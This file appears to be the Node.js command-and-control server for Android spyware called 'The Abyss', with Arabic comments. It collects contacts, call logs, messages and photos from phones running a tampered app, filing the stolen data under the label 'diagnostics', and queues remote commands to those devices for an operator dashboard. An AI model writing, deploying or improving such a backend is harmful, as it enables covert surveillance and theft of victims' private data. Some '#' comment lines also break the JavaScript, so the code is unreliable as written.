const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

// ============================================
# The Abyss - Server Configuration
# ============================================

// ============================================
# إعدادات قابلة للتعديل - EDIT THESE VALUES
# ============================================
const DEVICE_KEY = "the-abyss-secret-key"; // يجب أن تطابق x-device-key في Smali
// ============================================

// قاعدة البيانات
function readDB() {
    if (!fs.existsSync(DB_FILE)) {
        return { devices: {}, diagnostics: {}, commandQueues: {} };
    }
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        return { devices: {}, diagnostics: {}, commandQueues: {} };
    }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function cleanId(id) {
    if (typeof id !== 'string') return 'unknown';
    return id.substring(0, 64).replace(/[^a-zA-Z0-9_-]/g, '_');
}

// ============================================
// Middleware - التحقق من مفتاح الجهاز
// ============================================
function checkDeviceKey(req, res, next) {
    const key = req.headers['x-device-key'];
    if (key !== DEVICE_KEY) {
        return res.status(403).json({ error: "Invalid device key" });
    }
    next();
}

// ============================================
// API - استقبال البيانات من التطبيق (Smali)
// ============================================

// 1. استقبال Ping (إشارة "متصل")
app.post("/api/diagnostics/ping", checkDeviceKey, (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const db = readDB();
    
    if (!db.devices[deviceId]) {
        db.devices[deviceId] = { model: deviceId, firstSeen: Date.now() };
    }
    db.devices[deviceId].lastSeen = Date.now();
    db.devices[deviceId].status = 'online';
    
    // تهيئة طابور الأوامر إذا لم يكن موجوداً
    if (!db.commandQueues[deviceId]) {
        db.commandQueues[deviceId] = [];
    }
    
    writeDB(db);
    io.emit('device_update', { deviceId, status: 'online', lastSeen: Date.now() });
    res.json({ ok: true, deviceId });
});

// 2. استقبال البيانات (جهات اتصال، مكالمات، رسائل، صور)
app.post("/api/diagnostics/:category", checkDeviceKey, (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const category = req.params.category;
    const items = Array.isArray(req.body?.items) ? req.body.items : [];
    const count = Number(req.body?.count) || items.length;
    
    const db = readDB();
    if (!db.devices[deviceId]) {
        db.devices[deviceId] = { model: deviceId, firstSeen: Date.now() };
    }
    db.devices[deviceId].lastSeen = Date.now();
    db.devices[deviceId].status = 'online';
    
    if (!db.diagnostics[deviceId]) db.diagnostics[deviceId] = {};
    db.diagnostics[deviceId][category] = {
        updatedAt: Date.now(),
        count: count,
        items: items
    };
    
    writeDB(db);
    io.emit('diagnostics_update', { deviceId, category, count, data: db.diagnostics[deviceId][category] });
    res.json({ ok: true, received: count });
});

// ============================================
// API - الأوامر (Command Queue)
// ============================================

// 3. جلب الأوامر (يسأل عنها التطبيق)
app.get("/api/commands/:deviceId", checkDeviceKey, (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const db = readDB();
    
    if (!db.commandQueues[deviceId]) db.commandQueues[deviceId] = [];
    
    // إذا كان هناك أمر في الطابور، أرسله وأزله
    if (db.commandQueues[deviceId].length > 0) {
        const command = db.commandQueues[deviceId].shift();
        writeDB(db);
        return res.json(command);
    }
    
    // لا يوجد أوامر
    res.json({});
});

// 4. إرسال أمر جديد من الواجهة إلى التطبيق
app.post("/api/commands/:deviceId", (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const action = req.body?.action;
    const data = req.body?.data || "";
    
    if (!action) return res.status(400).json({ error: "Missing action" });
    
    const db = readDB();
    if (!db.commandQueues[deviceId]) db.commandQueues[deviceId] = [];
    
    db.commandQueues[deviceId].push({
        type: "command",
        action: action,
        data: data,
        timestamp: Date.now()
    });
    
    writeDB(db);
    io.emit('command_sent', { deviceId, action });
    res.json({ ok: true });
});

// 5. استقبال نتيجة تنفيذ الأمر من التطبيق
app.post("/api/command-result", checkDeviceKey, (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const result = req.body;
    
    io.emit('command_result', { deviceId, result });
    res.json({ ok: true });
});

// ============================================
// API - للواجهة (Dashboard)
// ============================================

// 6. جلب قائمة الأجهزة
app.get("/api/devices", (req, res) => {
    const db = readDB();
    const devices = Object.keys(db.devices).map(id => ({
        id: id,
        model: db.devices[id].model || id,
        status: db.devices[id].status || 'offline',
        lastSeen: db.devices[id].lastSeen || 0
    }));
    res.json({ devices });
});

// 7. جلب بيانات جهاز معين
app.get("/api/diagnostics/:deviceId", (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const db = readDB();
    res.json({ diagnostics: db.diagnostics[deviceId] || {} });
});

// 8. جلب فئة محددة
app.get("/api/diagnostics/:deviceId/:category", (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const category = req.params.category;
    const db = readDB();
    res.json(db.diagnostics[deviceId]?.[category] || { items: [], count: 0 });
});

// ============================================
// WebSocket - للواجهة (Real-Time)
// ============================================
io.on('connection', (socket) => {
    console.log('[WS] Dashboard connected');
    
    // إرسال قائمة الأجهزة عند الاتصال
    const db = readDB();
    const devices = Object.keys(db.devices).map(id => ({
        id: id,
        model: db.devices[id].model || id,
        status: db.devices[id].status || 'offline',
        lastSeen: db.devices[id].lastSeen || 0
    }));
    socket.emit('devices_list', devices);
    
    socket.on('disconnect', () => {
        console.log('[WS] Dashboard disconnected');
    });
});

// ============================================
// الصفحة الرئيسية
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// بدء الخادم
// ============================================
server.listen(PORT, () => {
    console.log(`[The Abyss] Server running on port ${PORT}`);
});